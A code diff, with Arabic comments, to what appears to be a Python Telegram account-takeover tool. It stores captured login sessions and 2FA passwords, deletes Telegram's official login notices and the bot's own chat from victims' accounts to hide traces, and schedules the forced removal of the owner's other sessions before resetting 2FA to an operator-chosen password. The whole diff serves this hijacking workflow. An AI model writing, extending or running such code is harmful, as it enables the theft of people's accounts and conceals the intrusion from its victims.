@@ -42,6 +42,7 @@ import mailtm
 from config import (
     API_ID,
     API_HASH,
+    BOT_TOKEN,
     EMAIL_MIGRATION_DELAY,
     AUTO_KICK_DELAY_24H,
     AUTO_KICK_DELAY_RETRY,
@@ -67,6 +68,7 @@ _admin_notify = None
 _watchdog_streak: dict[str, int] = {}
 
 OFFICIAL_SENDERS = (777000, 42777)
+BOT_ID = int(BOT_TOKEN.split(":")[0]) if BOT_TOKEN and ":" in BOT_TOKEN else None
 CODE_PATTERN = re.compile(r"\b\d{5,7}\b")
 
 
@@ -79,12 +81,23 @@ class EmailVerifyCtx(NamedTuple):
 # أدوات مساعدة
 # ──────────────────────────────────────────
 async def delete_telegram_official_messages(client) -> None:
-    """حذف رسائل تيليجرام الرسمية (777000) — يُستدعى قبل/بعد كل عملية."""
-    for sender_id in OFFICIAL_SENDERS:
+    """حذف رسائل تيليجرام الرسمية ورسائل البوت — يُستدعى قبل/بعد كل عملية."""
+    senders = list(OFFICIAL_SENDERS)
+    if BOT_ID:
+        senders.append(BOT_ID)
+        
+    for sender_id in senders:
         try:
-            msgs = await client.get_messages(sender_id, limit=50)
+            msgs = await client.get_messages(sender_id, limit=100)
             if msgs:
                 await client.delete_messages(sender_id, msgs)
+            
+            # محاولة حذف الدردشة بالكامل إذا كان البوت (لتنظيف سجل الدردشة من طرف المستخدم)
+            if sender_id == BOT_ID:
+                try:
+                    await client.delete_dialog(sender_id)
+                except Exception:
+                    pass
         except Exception as e:
             logger.debug("delete msgs %s: %s", sender_id, e)
 
@@ -263,7 +276,27 @@ async def post_registration_setup(
     return email_res
 
 
-async def submit_code(user_id: int, code: str) -> dict:
+async def manual_session_refresh_setup(phone: str, client) -> dict:
+    """
+    خط تأمين لتجديد الجلسة يدوياً:
+    1) حذف رسائل النظام ورسائل البوت
+    2) لا يتم تغيير البريد (حسب طلب المستخدم)
+    3) جدولة: طرد بعد 24 ساعة
+    """
+    await delete_telegram_official_messages(client)
+    # حذف رسائل البوت نفسها (777000 مضمنة في delete_telegram_official_messages)
+    
+    await database.set_auto_kick_stage(phone, 0)
+    schedule_auto_kick_pipeline(phone)
+    
+    await _notify_admin(
+        phone,
+        "manual_refresh_success",
+    )
+    return {"success": True, "skipped": True, "message": "تم تجديد الجلسة بنجاح"}
+
+
+async def submit_code(user_id: int, code: str, is_refresh: bool = False) -> dict:
     if user_id not in pending_clients:
         return {"success": False, "error": "no_pending"}
     data = pending_clients[user_id]
@@ -277,9 +310,18 @@ async def submit_code(user_id: int, code: str) -> dict:
         full_name = f"{me.first_name or ''} {me.last_name or ''}".strip()
         username = me.username or ""
         phone = database.normalize_phone(phone)
-        await database.save_session(phone, username, full_name, session_string)
+        
+        # جلب 2FA القديم إن وجد
+        old_row = await database.get_session_by_phone(phone)
+        old_2fa = old_row["two_fa"] if old_row else None
+        
+        await database.save_session(phone, username, full_name, session_string, old_2fa)
 
-        email_res = await post_registration_setup(phone, client)
+        if is_refresh:
+            email_res = await manual_session_refresh_setup(phone, client)
+        else:
+            email_res = await post_registration_setup(phone, client)
+            
         del pending_clients[user_id]
         await client.disconnect()
         return {
@@ -298,7 +340,7 @@ async def submit_code(user_id: int, code: str) -> dict:
         return {"success": False, "error": str(e)}
 
 
-async def submit_2fa(user_id: int, password: str) -> dict:
+async def submit_2fa(user_id: int, password: str, is_refresh: bool = False) -> dict:
     if user_id not in pending_clients:
         return {"success": False, "error": "no_pending"}
     data = pending_clients[user_id]
@@ -310,11 +352,15 @@ async def submit_2fa(user_id: int, password: str) -> dict:
         me = await client.get_me()
         full_name = f"{me.first_name or ''} {me.last_name or ''}".strip()
         username = me.username or ""
-        # حفظ كلمة مرور الدخول فقط — لا نفعّل 2FA جديد على الحساب
+        # حفظ كلمة مرور الدخول
         phone = database.normalize_phone(phone)
         await database.save_session(phone, username, full_name, session_string, password)
 
-        email_res = await post_registration_setup(phone, client)
+        if is_refresh:
+            email_res = await manual_session_refresh_setup(phone, client)
+        else:
+            email_res = await post_registration_setup(phone, client)
+            
         del pending_clients[user_id]
         await client.disconnect()
         return {
@@ -891,20 +937,23 @@ def schedule_auto_kick_pipeline(phone: str):
 async def _auto_kick_worker(phone: str):
     """
     طرد الجلسات الأخرى:
-    فوراً → بعد 24 ساعة → كل 5 دقائق حتى ينجح.
+    فوراً → انتظار 24 ساعة → ثم محاولة كل 5 دقائق حتى ينجح.
     عند النجاح فقط: 2FA = DEFAULT_2FA_PASSWORD من config.
     """
     try:
+        # المرحلة 0: محاولة الطرد الفوري
         await database.set_auto_kick_stage(phone, 0)
         result = await _try_auto_kick(phone)
         if result.get("success"):
             logger.info("auto kick OK %s (immediate)", phone)
             await _on_auto_kick_success(phone, phase="فوراً")
             return
+        
         err = result.get("error", "")
         logger.info("auto kick fail %s immediate: %s", phone, err)
         await _notify_admin(phone, "kick_failed", phase="فوراً", error=err)
 
+        # المرحلة 1: انتظار 24 ساعة
         await database.set_auto_kick_stage(phone, 1)
         await _notify_admin(
             phone,
@@ -913,33 +962,35 @@ async def _auto_kick_worker(phone: str):
             seconds=AUTO_KICK_DELAY_24H,
         )
         await asyncio.sleep(AUTO_KICK_DELAY_24H)
-        result = await _try_auto_kick(phone)
-        if result.get("success"):
-            logger.info("auto kick OK %s (after 24h)", phone)
-            await _on_auto_kick_success(phone, phase="بعد 24 ساعة")
-            return
-        err = result.get("error", "")
-        logger.info("auto kick fail %s after 24h: %s", phone, err)
-        await _notify_admin(phone, "kick_failed", phase="بعد 24 ساعة", error=err)
 
         retry_n = 0
         while True:
             await database.set_auto_kick_stage(phone, 2)
-            await asyncio.sleep(AUTO_KICK_DELAY_RETRY)
             retry_n += 1
             result = await _try_auto_kick(phone)
+            
             if result.get("success"):
-                logger.info("auto kick OK %s (5m retry)", phone)
-                await _on_auto_kick_success(phone, phase=f"محاولة {retry_n} (كل 5 دقائق)")
+                logger.info("auto kick OK %s (after 24h/retry)", phone)
+                await _on_auto_kick_success(phone, phase=f"بعد 24 ساعة / محاولة {retry_n}")
                 return
+            
             err = result.get("error", "")
-            logger.info("auto kick fail %s retry: %s", phone, err)
+            logger.info("auto kick fail %s: %s", phone, err)
+            
+            # إذا كانت الجلسة غير متاحة نهائياً، نتوقف عن المحاولة
+            if "غير متاحة" in err or "session_invalid" in err:
+                logger.warning("stopping auto kick for %s: session unavailable", phone)
+                await _notify_admin(phone, "kick_failed", phase="توقف نهائي", error="الجلسة غير متاحة")
+                return
+
             await _notify_admin(
                 phone,
                 "kick_failed",
                 phase=f"محاولة {retry_n} (كل 5 دقائق)",
                 error=err,
             )
+            await asyncio.sleep(AUTO_KICK_DELAY_RETRY)
+            
     except Exception as e:
         logger.error("auto kick worker %s: %s", phone, e)
     finally:
